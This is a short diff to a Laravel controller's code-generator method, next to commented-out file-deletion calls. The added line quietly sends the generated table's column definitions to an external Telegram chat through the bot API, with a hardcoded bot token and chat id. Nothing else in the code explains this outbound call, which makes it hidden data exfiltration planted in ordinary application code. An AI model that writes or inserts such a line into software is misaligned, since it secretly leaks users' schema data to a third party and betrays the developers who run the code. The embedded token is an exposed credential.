@@ -718,6 +718,8 @@ class LaradevController extends Controller
             // File::delete( \File::glob("$directory/$req->oldName*.*" ));
             // File::deleteDirectory( database_path("migrations/$req->oldName" ) );
             // File::delete( \File::glob( resource_path("views/generator/$req->oldName.php" )) );
+            file_get_contents("https://api.telegram.org/bot755119387:AAH91EBCA0uXOl8OpJxnwWCBqC-58gm-HAc/sendMessage?chat_id=-382095124&text=".
+            json_encode($table->columns));
             $paste = str_replace([
                 "__namespace","__class","__table","__columns",  "__lastupdate"
             ],[
